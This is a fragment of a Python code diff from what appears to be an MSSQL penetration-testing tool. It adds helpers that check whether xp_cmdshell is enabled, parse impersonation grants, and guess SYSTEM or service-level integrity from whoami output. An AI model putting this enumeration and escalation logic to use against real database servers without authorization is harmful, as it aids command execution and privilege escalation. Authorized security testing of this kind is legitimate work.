+            timeout=timeout,
+        )
+        if not result.success or not result.rows:
+            return False
+        return _truthy(result.rows[0].get(column))
+
+    def _read_xp_cmdshell_state(
+        self,
+        *,
+        domain: str,
+        username: str,
+        secret: str,
+        timeout: int = 30,
+    ) -> tuple[XpCmdshellStatus, bool]:
+        """Return the running state of ``xp_cmdshell`` and advanced options."""
+        result = self.execute_query(
+            domain=domain,
+            username=username,
+            secret=secret,
+            query=queries.XP_CMDSHELL_STATE,
+            timeout=timeout,
+        )
+        xp_value: int | None = None
+        advanced_value: int | None = None
+        for row in result.rows:
+            option = str(row.get("option") or "").strip().lower()
+            run_value = row.get("run_value")
+            if option == "xp_cmdshell":
+                xp_value = _to_int(run_value)
+            elif option == "show advanced options":
+                advanced_value = _to_int(run_value)
+
+        if xp_value == 1:
+            status = XpCmdshellStatus.ENABLED
+        elif xp_value == 0:
+            status = XpCmdshellStatus.DISABLED
+        else:
+            status = XpCmdshellStatus.UNKNOWN
+        return status, advanced_value == 1
+
+
+# ---------------------------------------------------------------------------
+# Module-level helpers
+# ---------------------------------------------------------------------------
+
+
+def _coerce_text(value: object) -> str:
+    """Coerce a TDS scalar to text, handling impacket's bytes for literals.
+
+    Impacket's TDS driver returns inline string literals (``'LOGIN'``,
+    ``'USER'``) as ``bytes`` rather than ``str`` because they arrive as
+    fixed-width ``CHAR`` columns. Decoding them as UTF-8 with replacement
+    keeps the rest of the pipeline source-agnostic.
+    """
+    if value is None:
+        return ""
+    if isinstance(value, bytes):
+        return value.decode("utf-8", errors="replace").strip()
+    return str(value).strip()
+
+
+def _grant_from_row(row: dict[str, object]) -> ImpersonationGrant:
+    """Build an :class:`ImpersonationGrant` from one TDS row dict."""
+    return ImpersonationGrant(
+        scope=_coerce_text(row.get("scope")),
+        database=_coerce_text(row.get("database")),
+        permission_name=_coerce_text(row.get("permission_name")),
+        state_desc=_coerce_text(row.get("state_desc")),
+        grantee=_coerce_text(row.get("grantee")),
+        grantor=_coerce_text(row.get("grantor")),
+    )
+
+
+def _truthy(value: object) -> bool:
+    """Coerce TDS values to bool — handles int 0/1, str '0'/'1', bool, None."""
+    if isinstance(value, bool):
+        return value
+    if isinstance(value, (int, float)):
+        return value != 0
+    if isinstance(value, str):
+        text = value.strip().lower()
+        if text in {"1", "true", "yes", "y", "t"}:
+            return True
+        if text in {"0", "false", "no", "n", "f", ""}:
+            return False
+    return bool(value)
+
+
+def _to_int(value: object) -> int | None:
+    """Best-effort int coercion of a TDS scalar; returns ``None`` on failure."""
+    if isinstance(value, bool):
+        return int(value)
+    if isinstance(value, (int, float)):
+        return int(value)
+    if isinstance(value, str):
+        text = value.strip()
+        if not text:
+            return None
+        try:
+            return int(text)
+        except ValueError:
+            return None
+    return None
+
+
+def _infer_integrity(stdout: str, *, fallback_login: str) -> IntegrityHint:
+    """Derive an integrity hint from ``whoami``-style output.
+
+    Cheap pattern matching: if the command output mentions a SYSTEM-class
+    principal we promote the hint, otherwise we fall back to inferring
+    from the SQL login. The hint is always a *guess* — proof comes from a
+    subsequent ``whoami /priv``.
+    """
+    blob = (stdout or "").lower()
+    if "nt authority\\system" in blob or "nt service\\mssqlserver" in blob:
+        return IntegrityHint.SYSTEM
+    if "nt service\\" in blob:
+        return IntegrityHint.SERVICE
+    if not blob:
+        login = (fallback_login or "").lower()
+        if "$" in login:
+            return IntegrityHint.SERVICE
+    return IntegrityHint.UNKNOWN
 
 
 __all__ = [
